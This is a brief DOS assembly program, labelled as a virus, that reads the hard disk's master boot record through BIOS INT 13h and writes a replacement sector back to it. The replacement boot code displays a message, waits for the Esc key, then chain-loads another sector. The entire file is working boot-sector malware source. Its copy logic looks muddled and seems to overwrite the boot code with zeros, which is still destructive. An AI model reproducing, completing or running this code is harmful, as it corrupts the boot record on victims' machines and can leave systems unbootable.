FORMAT MZ
MOV AH,2
MOV AL,1
MOV BX,PAYLOAD0
MOV CX,1
MOV DX,80H
INT 13H
MOV DI,PAYLOAD0
MOV SI,PAYLOAD1
MOV CX,1BDH
REP MOVSB
MOV AH,3
MOV AL,1
MOV CX,1
INT 13H
MOV AH,4CH
INT 21H
PAYLOAD0:

;virus:
mov ax,1300h
mov bx,30h
mov cx,509
mov dx,0
push cs
pop es
mov bp,L2    ;Address of String
INT 10h
L1:
IN AL,60H
CMP AL,1
JNZ L1
MOV AX,201H
XOR BX,BX
MOV ES,BX
MOV BX,7C00H
MOV CX,7
MOV DX,80H
INT 13H
JMP 0:7C00H
L2:
Texto1 db '...',0
PAYLOAD1 DB 512 DUP (0)
